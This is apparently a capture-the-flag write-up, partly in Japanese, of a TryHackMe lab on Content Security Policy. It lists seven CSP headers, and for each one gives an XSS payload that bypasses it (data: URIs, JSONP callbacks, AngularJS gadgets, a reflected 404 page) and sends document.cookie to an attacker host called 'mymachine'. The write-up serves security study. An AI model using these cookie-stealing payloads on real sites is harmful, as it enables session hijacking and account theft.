# Content Security Policy  writeup
https://tryhackme.com/room/csp

## Task7

### #1
```HTTP
Content-Security-Policy: default-src * 'unsafe-inline';
```

```html
<script>fetch(`http://mymachine/${document.cookie}`)</script>
```

### #2
```HTTP
Content-Security-Policy: default-src *; style-src 'self'; script-src data:
```

```html
<script src="data:application/javascript,fetch(`http://mymachine/${document.cookie}`)"></script>
```

Content-Type指定は無くてもよい模様。
```html
<script src="data:,fetch(`http://mymachine/${document.cookie}`)"></script>
```

### #3
```HTTP
Content-Security-Policy: default-src 'none'; img-src *; style-src 'self'; 
```

```html
<img id="hoge" src=""><script>document.getElementById('hoge').src="http://mymachine/" + document.cookie;</script>
```

### #4
```HTTP
Content-Security-Policy: default-src 'none'; style-src * 'self'; script-src 'nonce-abcdef'
```

```html
<link id="hoge" rel="stylesheet" href="">
<script nonce="abcdef">document.getElementById('hoge').href="http://mymachine/" + document.cookie;</script>
```

### #5
```HTTP
Content-Security-Policy: default-src 'none'; style-src 'self'; img-src *; script-src 'unsafe-eval' *.google.com
```

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=eval(window.open('http%3A%2F%2Fmymachine%2F'.concat(document.cookie)))"></script>
```

### #6
```HTTP
Content-Security-Policy: default-src 'none'; img-src *; style-src 'self'; script-src 'unsafe-eval' cdnjs.cloudflare.com
```

```html
<div class=""ng-app ng-csp>
  <base href=//cdnjs.cloudflare.com/ajax/libs/>
  <script src=angular.js/1.8.1/angular.js></script>
  <script src=prototype/1.7.2/prototype.js></script>
  {{$on.curry.call().console.log($on.curry.call().location=("http://mymachine/"+$on.curry.call().document.cookie))}}
</div>
```

### #7
```HTTP
Content-Security-Policy: default-src 'none'; media-src *; style-src 'self'; script-src 'self'
```

media-srcを使うようなので、audioやvideoが思い当たる。
ヒントが`404`なので、試しに、Target IPに存在しないディレクトリ名・ファイル名を付けてアクセスしてみる。

```
https://target_IP:3007/test/test.html
```

```HTTP
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 48
ETag: W/"30-cvuYSfoidujsEUt7m9vyFANmAEI"
Date: Sun, 01 Nov 2020 14:34:22 GMT
Connection: keep-alive

Error ( 404 ) - 'Unable to find /test/test.html'
```

URLのうち、ドメイン以下の部分がレスポンスに含まれていることが分かる。  
`script src`から存在しないURLを指定し、ボディ内のJavaScriptが返ってくれば動作することが期待できる。

下記のように書いた場合、スクリプトを含むボディを返すことができる。
```
https://target_IP/'; new Audio('http://mymachine/' + document.cookie);//
```

```HTTP
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 104
ETag: W/"68-DLlLYD53GpjPWook74UFl+58B7o"
Date: Sun, 01 Nov 2020 14:46:03 GMT
Connection: keep-alive

Error ( 404 ) - 'Unable to find /'; new Audio('http://mymachine/' + document.cookie);//'
```

確認出来たら、これを`script src`から呼ぶように書けば完成。
```html
<script src="'; new Audio('http://mymachine/' + document.cookie);//"></script>
```

